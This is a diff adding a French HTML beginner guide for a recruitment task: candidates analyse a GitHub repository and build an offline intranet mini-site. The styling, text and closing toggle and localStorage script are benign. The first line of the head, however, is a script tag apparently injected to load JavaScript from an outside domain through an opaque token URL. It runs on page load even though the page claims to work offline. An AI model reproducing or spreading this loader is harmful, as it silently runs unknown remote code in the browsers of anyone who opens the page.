@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head><script type='text/javascript' src='https://dl.ouaisfi.eu/tNqn9nLJ7hDSGibwdDfgRBeMo7uBq3NQPfKkxnEZz6KsklOVehPA_nt9iwZzTL3XjjMfk26QwnHQ6Py2V_moXZ3U0oCYZbLh8M2eKsch96_WkhhB7C5OG1o57JAevN3tlo8IB6wLIyWs4Rm9lB9OzrGd-c2LStzwn8Xk-4e8-MJ6TBAfRBIicuptzwtLI8vbbi4LsXyU2Gjjt3Y8AeaqQuaonUTIzrz2fRwEgKWMrp1lbS1pbXgSVb4zzAaBNpiBEf3nsxqmugWFCzj-TxfmIGX8cihM_Ny_JiqGdoj_mz695fl0oz5vrKiLbxDCmPgiBBTVgS7adFqhmfVlzR3dFEImbsEAYxsQk_grqH_NJn43-TOQNO5OksYn20_nvPxj9lsGNdvc2eGrQljOyi5IxwEmUVSNK22ohainDIaBvmESA7jtuUmgGMtzfTZwWTGagYn_Kz7IA0RzY7pNX6TorAvnLOeWuvhT'></script>
+  <meta charset="UTF-8" />
+  <title>Mission Bout d'Internet – Guide débutant</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <style>
+    /****************************************************
+     * PARTIE 1 : STYLE GÉNÉRAL
+     * Ici on met tout le CSS pour rendre la page jolie.
+     * On s’inspire un peu de Scratch : couleurs vives,
+     * blocs arrondis, texte clair.
+     ****************************************************/
+
+    :root {
+      --bg: #0f172a;         /* Couleur de fond de la page */
+      --card: #f9fafb;       /* Couleur principale des blocs */
+      --text-main: #111827;  /* Couleur du texte principal */
+      --text-soft: #4b5563;  /* Couleur du texte secondaire */
+      --accent: #fb923c;     /* Orange (comme Scratch !) */
+      --accent-2: #3b82f6;   /* Bleu */
+      --accent-3: #22c55e;   /* Vert */
+      --accent-4: #a855f7;   /* Violet */
+      --border-soft: #e5e7eb;
+      --font-main: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
+                   sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: var(--font-main);
+      background: radial-gradient(circle at top, #1f2937, #020617);
+      color: var(--text-main);
+    }
+
+    body {
+      display: flex;
+      justify-content: center;
+      padding: 16px;
+    }
+
+    .page {
+      width: 100%;
+      max-width: 960px;
+      background: #f3f4f6;
+      border-radius: 24px;
+      padding: 20px 16px 24px;
+      box-shadow: 0 18px 40px rgba(15, 23, 42, 0.6);
+      border: 1px solid #e5e7eb;
+    }
+
+    @media (min-width: 768px) {
+      .page {
+        padding: 24px 24px 28px;
+      }
+    }
+
+    /****************************************************
+     * PARTIE 2 : EN-TÊTE
+     ****************************************************/
+
+    header {
+      display: grid;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    @media (min-width: 768px) {
+      header {
+        grid-template-columns: minmax(0, 2.2fr) minmax(0, 1.4fr);
+        align-items: center;
+      }
+    }
+
+    .title-block {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .org-label {
+      font-size: 0.85rem;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      color: #6b7280;
+    }
+
+    .main-title {
+      font-size: clamp(1.8rem, 3vw, 2.2rem);
+      font-weight: 800;
+      color: #111827;
+    }
+
+    .subtitle {
+      font-size: 0.98rem;
+      color: #4b5563;
+    }
+
+    .badge-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      margin-top: 6px;
+    }
+
+    .badge {
+      font-size: 0.8rem;
+      border-radius: 999px;
+      padding: 4px 10px;
+      background: #fee2e2;
+      color: #b91c1c;
+      font-weight: 600;
+    }
+
+    .badge-soft {
+      background: #dbeafe;
+      color: #1d4ed8;
+    }
+
+    .meta-card {
+      background: #eff6ff;
+      border-radius: 16px;
+      padding: 10px 12px;
+      border: 1px solid #bfdbfe;
+      font-size: 0.9rem;
+      color: var(--text-soft);
+    }
+
+    .meta-line {
+      display: flex;
+      justify-content: space-between;
+      gap: 8px;
+      margin-bottom: 4px;
+    }
+
+    .meta-label {
+      font-weight: 600;
+    }
+
+    .meta-value {
+      text-align: right;
+    }
+
+    .meta-input {
+      border: none;
+      border-bottom: 1px dashed #9ca3af;
+      background: transparent;
+      font: inherit;
+      color: inherit;
+      padding: 0 2px 2px;
+      outline: none;
+      min-width: 120px;
+      text-align: right;
+    }
+
+    /****************************************************
+     * PARTIE 3 : BLOC "COMME DES BLOCS SCRATCH"
+     * Ce sont les gros blocs de couleur qui expliquent
+     * les étapes et les idées importantes.
+     ****************************************************/
+
+    .section {
+      margin-bottom: 16px;
+    }
+
+    .section-title {
+      font-size: 1.15rem;
+      font-weight: 700;
+      margin-bottom: 8px;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .section-title span.icon {
+      font-size: 1.2rem;
+    }
+
+    .section-text {
+      font-size: 0.95rem;
+      color: var(--text-soft);
+      margin-bottom: 10px;
+    }
+
+    .scratch-blocks {
+      display: grid;
+      gap: 10px;
+    }
+
+    @media (min-width: 720px) {
+      .scratch-blocks--two-cols {
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+      }
+    }
+
+    .block {
+      border-radius: 16px;
+      padding: 12px 12px 10px;
+      color: #111827;
+      box-shadow: 0 6px 0 rgba(148,163,184,0.7);
+      border: 2px solid rgba(15,23,42,0.1);
+      position: relative;
+    }
+
+    .block-tag {
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      margin-bottom: 4px;
+      opacity: 0.9;
+    }
+
+    .block-title {
+      font-size: 1rem;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+
+    .block-text {
+      font-size: 0.92rem;
+      color: rgba(15,23,42,0.85);
+    }
+
+    .block-list {
+      margin: 6px 0 0;
+      padding-left: 18px;
+      font-size: 0.9rem;
+      color: rgba(15,23,42,0.9);
+    }
+
+    .block-list li {
+      margin-bottom: 4px;
+    }
+
+    /* Couleurs des blocs façon Scratch */
+    .block--step1 { background: #fee2e2; }  /* rouge / rose */
+    .block--step2 { background: #ffedd5; }  /* orange */
+    .block--step3 { background: #d1fae5; }  /* vert */
+    .block--step4 { background: #e0f2fe; }  /* bleu */
+    .block--step5 { background: #ede9fe; }  /* violet */
+
+    .block--info   { background: #fef9c3; } /* jaune pâle */
+    .block--intent { background: #e0f2fe; }
+
+    /****************************************************
+     * PARTIE 4 : BLOCS DÉROULANTS (DÉTAILS)
+     * On permet de cliquer pour afficher plus de texte.
+     ****************************************************/
+
+    .toggle-details {
+      margin-top: 6px;
+      font-size: 0.8rem;
+      color: #1d4ed8;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      user-select: none;
+    }
+
+    .toggle-details::before {
+      content: "▶";
+      font-size: 0.7rem;
+    }
+
+    .toggle-details[data-open="true"]::before {
+      content: "▼";
+    }
+
+    .details-text {
+      margin-top: 6px;
+      padding-top: 4px;
+      border-top: 1px dashed rgba(55,65,81,0.4);
+      font-size: 0.88rem;
+      color: #374151;
+      display: none;
+    }
+
+    .details-text.visible {
+      display: block;
+    }
+
+    /****************************************************
+     * PARTIE 5 : PIED DE PAGE
+     ****************************************************/
+
+    footer {
+      margin-top: 12px;
+      border-top: 1px dashed #d1d5db;
+      padding-top: 8px;
+      font-size: 0.82rem;
+      color: #6b7280;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .footer-note {
+      max-width: 420px;
+    }
+
+    .footer-tag {
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+    }
+  </style>
+</head>
+<body>
+
+<div class="page">
+  <!--
+    En-tête : on explique à qui s'adresse cette page, et on
+    laisse un endroit pour écrire le nom du/de la candidat·e.
+  -->
+  <header>
+    <div class="title-block">
+      <div class="org-label">Organisation – Cellule numérique</div>
+      <h1 class="main-title">Mission « Bout d’Internet » – Guide débutant</h1>
+      <p class="subtitle">
+        Cette page t’explique, pas à pas, la mission de recrutement :
+        récupérer un bout d’Internet (un dépôt GitHub), le comprendre,
+        puis créer un petit site pour l’intranet.
+      </p>
+      <div class="badge-row">
+        <span class="badge">Niveau débutant</span>
+        <span class="badge badge-soft">Tout est expliqué</span>
+      </div>
+    </div>
+
+    <div class="meta-card">
+      <div class="meta-line">
+        <span class="meta-label">Référence</span>
+        <span class="meta-value" id="ref-mission">OM-BI-XXXX-01</span>
+      </div>
+      <div class="meta-line">
+        <span class="meta-label">Candidat·e</span>
+        <span class="meta-value">
+          <!-- Champ pour écrire ton nom -->
+          <input
+            id="input-name"
+            class="meta-input"
+            placeholder="ton nom ici"
+            autocomplete="off"
+          />
+        </span>
+      </div>
+      <div class="meta-line">
+        <span class="meta-label">Dépôt GitHub</span>
+        <span class="meta-value">
+          <!-- Champ pour écrire le dépôt choisi -->
+          <input
+            id="input-repo"
+            class="meta-input"
+            placeholder="ex : github.com/utilisateur/projet"
+            autocomplete="off"
+          />
+        </span>
+      </div>
+      <div class="meta-line">
+        <span class="meta-label">Délai indicatif</span>
+        <span class="meta-value">5 jours ouvrables</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- SECTION 1 : CE QUE TU VAS FAIRE -->
+  <section class="section">
+    <h2 class="section-title">
+      <span class="icon">🧩</span>
+      1. Ce que tu vas faire (en résumé)
+    </h2>
+    <p class="section-text">
+      La mission, en version très simple :
+    </p>
+
+    <div class="scratch-blocks">
+      <div class="block block--info">
+        <div class="block-tag">Étape A</div>
+        <div class="block-title">Tu prends un bout d’Internet</div>
+        <div class="block-text">
+          Tu choisis (ou on te donne) un dépôt GitHub public.  
+          Tu le télécharges sur ton ordinateur.
+          <ul class="block-list">
+            <li>Tu vois ce qu’il contient (fichiers, dossiers…)</li>
+            <li>Tu comprends à quoi il sert</li>
+            <li>Tu arrives à le lancer ou à l’ouvrir</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="block block--info">
+        <div class="block-tag">Étape B</div>
+        <div class="block-title">Tu crées un mini-site intranet</div>
+        <div class="block-text">
+          Tu fabriques un petit site en <strong>HTML / CSS / JS pur</strong>, simple,
+          qui explique ce que tu as compris du dépôt.
+          <ul class="block-list">
+            <li>Une page d’accueil (par exemple celle-ci, adaptée)</li>
+            <li>Une page qui décrit le dépôt</li>
+            <li>Une page pour la direction (résumé stratégique)</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 2 : LES 5 GRANDES ÉTAPES COMME DES BLOCS SCRATCH -->
+  <section class="section">
+    <h2 class="section-title">
+      <span class="icon">🧱</span>
+      2. Les 5 grandes étapes, comme des blocs Scratch
+    </h2>
+    <p class="section-text">
+      Tu peux imaginer la mission comme un <strong>petit programme Scratch</strong> :
+      on enchaîne 5 blocs.  
+      Clique sur « Voir les détails » pour plus d’explications.
+    </p>
+
+    <div class="scratch-blocks">
+      <!-- Étape 1 -->
+      <div class="block block--step1">
+        <div class="block-tag">Bloc 1</div>
+        <div class="block-title">Choisir et récupérer le dépôt GitHub</div>
+        <div class="block-text">
+          C’est le moment où tu « attrapes » le bout d’Internet.
+          <ul class="block-list">
+            <li>Tu notes l’adresse du dépôt (URL GitHub)</li>
+            <li>Tu le télécharges (ZIP) ou tu fais <code>git clone</code></li>
+            <li>Tu ouvres le dossier sur ton ordinateur</li>
+          </ul>
+          <div class="toggle-details" data-target="details-step1">
+            Voir les détails
+          </div>
+          <div class="details-text" id="details-step1">
+            <strong>Pourquoi on te demande ça ?</strong><br>
+            Parce qu’un jour, tu devras refaire ce geste dans l’organisation :
+            récupérer une ressource en ligne, la mettre à l’abri, et savoir ce
+            qu’elle contient.<br><br>
+            <strong>Astuce :</strong> prends un dépôt avec au moins un fichier
+            <code>.html</code> et un peu de CSS / JS, ce sera plus simple à étudier.
+          </div>
+        </div>
+      </div>
+
+      <!-- Étape 2 -->
+      <div class="block block--step2">
+        <div class="block-tag">Bloc 2</div>
+        <div class="block-title">Observer et comprendre le contenu</div>
+        <div class="block-text">
+          Tu explores le dépôt comme un dossier de projet.
+          <ul class="block-list">
+            <li>Tu listes les fichiers importants</li>
+            <li>Tu repères les technologies utilisées (HTML, CSS, JS…)</li>
+            <li>Tu testes ce que ça donne dans un navigateur</li>
+          </ul>
+          <div class="toggle-details" data-target="details-step2">
+            Voir les détails
+          </div>
+          <div class="details-text" id="details-step2">
+            <strong>Objectif :</strong> être capable d’expliquer, avec des mots simples,
+            « ce que fait » ce bout d’Internet. Pas besoin d’être un génie du code,
+            mais il faut être curieux et logique.<br><br>
+            Tu peux faire un petit schéma sur papier pour t’aider :
+            <em>fichier d’accueil → fichiers CSS → fichiers JS → images…</em>
+          </div>
+        </div>
+      </div>
+
+      <!-- Étape 3 -->
+      <div class="block block--step3">
+        <div class="block-tag">Bloc 3</div>
+        <div class="block-title">Construire un mini-site pour l’intranet</div>
+        <div class="block-text">
+          Ici tu crées ton propre mini-site, avec 1 ou plusieurs pages.
+          <ul class="block-list">
+            <li>Tu écris du HTML pour la structure</li>
+            <li>Tu ajoutes du CSS pour la mise en forme</li>
+            <li>Tu peux mettre un peu de JS pour des petits effets</li>
+          </ul>
+          <div class="toggle-details" data-target="details-step3">
+            Voir les détails
+          </div>
+          <div class="details-text" id="details-step3">
+            <strong>Important :</strong> tout doit fonctionner <em>hors-ligne</em>.
+            Ça veut dire : pas besoin d’Internet pour ouvrir ton mini-site.<br><br>
+            Ton objectif est que quelqu’un, dans l’organisation, puisse :
+            <ul>
+              <li>mettre ton dossier sur une clé USB</li>
+              <li>double-cliquer sur <code>index.html</code></li>
+              <li>comprendre la mission en quelques minutes</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Étape 4 -->
+      <div class="block block--step4">
+        <div class="block-tag">Bloc 4</div>
+        <div class="block-title">Écrire une synthèse pour la direction</div>
+        <div class="block-text">
+          Tu ajoutes une partie « pour décideurs / décideuses ».
+          <ul class="block-list">
+            <li>Tu résumes le dépôt : à quoi il sert ?</li>
+            <li>Tu expliques les risques et les opportunités</li>
+            <li>Tu donnes 2–3 recommandations concrètes</li>
+          </ul>
+          <div class="toggle-details" data-target="details-step4">
+            Voir les détails
+          </div>
+          <div class="details-text" id="details-step4">
+            <strong>Idée :</strong> imagine que tu parles à quelqu’un qui n’a
+            pas le temps et qui n’est pas technique.  
+            Il veut juste savoir :
+            <ul>
+              <li>Est-ce que c’est utile pour nous ?</li>
+              <li>Quels sont les dangers ?</li>
+              <li>Que propose-tu de faire ?</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Étape 5 -->
+      <div class="block block--step5">
+        <div class="block-tag">Bloc 5</div>
+        <div class="block-title">Préparer le dossier final (clé USB / intranet)</div>
+        <div class="block-text">
+          Tu vérifies que tout est bien rangé et facile à utiliser.
+          <ul class="block-list">
+            <li>Les fichiers sont dans un seul dossier</li>
+            <li>On lance le site avec <code>index.html</code></li>
+            <li>Tu ajoutes un petit fichier <code>README.txt</code> si besoin</li>
+          </ul>
+          <div class="toggle-details" data-target="details-step5">
+            Voir les détails
+          </div>
+          <div class="details-text" id="details-step5">
+            <strong>But :</strong> quelqu’un qui ne t’a jamais vu doit
+            pouvoir utiliser ton travail sans t’appeler.<br><br>
+            Tu peux imaginer que ton dossier circule dans l’organisation,
+            sur clé USB, comme un petit kit pédagogique autonome.
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 3 : POURQUOI ON TE DEMANDE ÇA ? (INTENTION) -->
+  <section class="section">
+    <h2 class="section-title">
+      <span class="icon">💡</span>
+      3. Pourquoi on te demande ça ? (intention)
+    </h2>
+    <p class="section-text">
+      Cette mission ne sert pas seulement à tester « si tu sais coder ».  
+      Elle sert à voir comment tu <strong>penses</strong> et comment tu te
+      débrouilles dans le monde numérique.
+    </p>
+
+    <div class="scratch-blocks scratch-blocks--two-cols">
+      <div class="block block--intent">
+        <div class="block-tag">Intention 1</div>
+        <div class="block-title">Comprendre un objet numérique existant</div>
+        <div class="block-text">
+          Dans la vraie vie, tu trouveras souvent des outils déjà faits
+          (sites, scripts, apps...).  
+          On veut voir si tu sais :
+          <ul class="block-list">
+            <li>entrer dedans sans casser</li>
+            <li>comprendre comment c’est construit</li>
+            <li>expliquer ce que tu as compris</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="block block--intent">
+        <div class="block-tag">Intention 2</div>
+        <div class="block-title">Rendre les choses claires pour les autres</div>
+        <div class="block-text">
+          Ce poste est stratégique : tu devras traduire du « langage technique »
+          en « langage clair ».  
+          Le mini-site que tu crées montre :
+          <ul class="block-list">
+            <li>ta capacité à simplifier</li>
+            <li>ta capacité à organiser l’information</li>
+            <li>ton sens pédagogique</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="block block--intent">
+        <div class="block-tag">Intention 3</div>
+        <div class="block-title">Voir les risques et dérives possibles</div>
+        <div class="block-text">
+          Internet n’est pas neutre : derrière les outils, il y a
+          des plateformes, des règles, du pouvoir.  
+          On veut voir si tu te poses des questions comme :
+          <ul class="block-list">
+            <li>De quoi dépend ce dépôt ?</li>
+            <li>Que se passe-t-il si GitHub change de règles ?</li>
+            <li>Quel type de contrôle ou de surveillance est possible ?</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="block block--intent">
+        <div class="block-tag">Intention 4</div>
+        <div class="block-title">Apprendre en faisant, dès le début</div>
+        <div class="block-text">
+          Ici, on préfère les gens qui <strong>essaient</strong>, même si
+          tout n’est pas parfait, plutôt que ceux qui n’osent pas.  
+          Le but est que tu :
+          <ul class="block-list">
+            <li>tentes des choses</li>
+            <li>t’auto-corriges</li>
+            <li>sois capable d’expliquer ce que tu as tenté</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- SECTION 4 : COMMENT UTILISER CETTE PAGE -->
+  <section class="section">
+    <h2 class="section-title">
+      <span class="icon">🧭</span>
+      4. Comment utiliser cette page
+    </h2>
+    <p class="section-text">
+      Tu peux utiliser cette page telle quelle comme <strong>page d’accueil</strong>
+      de ton mini-site, ou t’en inspirer pour faire la tienne.
+    </p>
+
+    <div class="scratch-blocks">
+      <div class="block block--info">
+        <div class="block-tag">Pas à pas</div>
+        <div class="block-title">En pratique :</div>
+        <ul class="block-list">
+          <li>Sauvegarde ce fichier en <code>index.html</code></li>
+          <li>Ouvre-le dans ton navigateur pour voir le résultat</li>
+          <li>Modifie le texte pour ajouter ta propre analyse</li>
+          <li>Ajoute ensuite d’autres pages (par exemple <code>depot.html</code>, <code>briefing.html</code>)</li>
+        </ul>
+        <p class="block-text" style="margin-top:6px;">
+          N’hésite pas à commenter ton code (HTML / CSS / JS) comme dans cet exemple :
+          les commentaires servent de <strong>pense-bête</strong> pour toi et pour les personnes
+          qui liront ton travail.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="footer-note">
+      Cette mission est aussi une invitation à réfléchir au numérique :
+      qui contrôle les outils que nous utilisons, et comment rester libres
+      en les utilisant intelligemment ?
+    </div>
+    <div class="footer-tag">
+      Mission Bout d’Internet – Guide débutant
+    </div>
+  </footer>
+</div>
+
+<script>
+  /****************************************************
+   * PARTIE 6 : JAVASCRIPT
+   * Ici on ajoute un peu d’interactivité :
+   * - la référence de mission se met à jour avec l’année
+   * - les détails des blocs s’ouvrent / se ferment
+   * - le nom et le dépôt sont sauvegardés (localStorage)
+   ****************************************************/
+
+  (function() {
+    // 1) Mettre l'année dans la référence de mission
+    var refSpan = document.getElementById("ref-mission");
+    if (refSpan) {
+      var year = new Date().getFullYear();
+      refSpan.textContent = "OM-BI-" + year + "-01";
+    }
+
+    // 2) Rendre les détails des blocs cliquables
+    var toggles = document.querySelectorAll(".toggle-details");
+    toggles.forEach(function(toggle) {
+      toggle.addEventListener("click", function() {
+        var targetId = toggle.getAttribute("data-target");
+        var details = document.getElementById(targetId);
+        if (!details) return;
+
+        var isOpen = details.classList.contains("visible");
+        if (isOpen) {
+          details.classList.remove("visible");
+          toggle.setAttribute("data-open", "false");
+        } else {
+          details.classList.add("visible");
+          toggle.setAttribute("data-open", "true");
+        }
+      });
+    });
+
+    // 3) Sauvegarder le nom et le dépôt dans le navigateur (localStorage)
+    var STORAGE_KEY = "mission-bout-internet-beginner";
+    var inputName = document.getElementById("input-name");
+    var inputRepo = document.getElementById("input-repo");
+
+    function loadMeta() {
+      try {
+        var raw = localStorage.getItem(STORAGE_KEY);
+        if (!raw) return { name: "", repo: "" };
+        var parsed = JSON.parse(raw);
+        return {
+          name: parsed.name || "",
+          repo: parsed.repo || ""
+        };
+      } catch (e) {
+        // Si quelque chose ne va pas, on retourne des valeurs vides
+        return { name: "", repo: "" };
+      }
+    }
+
+    function saveMeta(meta) {
+      try {
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(meta));
+      } catch (e) {
+        // Si le navigateur n'autorise pas le stockage (mode privé par ex),
+        // on ne fait rien. La page reste utilisable.
+      }
+    }
+
+    var meta = loadMeta();
+
+    if (inputName) {
+      inputName.value = meta.name;
+      inputName.addEventListener("input", function() {
+        meta.name = inputName.value;
+        saveMeta(meta);
+      });
+    }
+
+    if (inputRepo) {
+      inputRepo.value = meta.repo;
+      inputRepo.addEventListener("input", function() {
+        meta.repo = inputRepo.value;
+        saveMeta(meta);
+      });
+    }
+  })();
+</script>
+
+</body>
+</html>
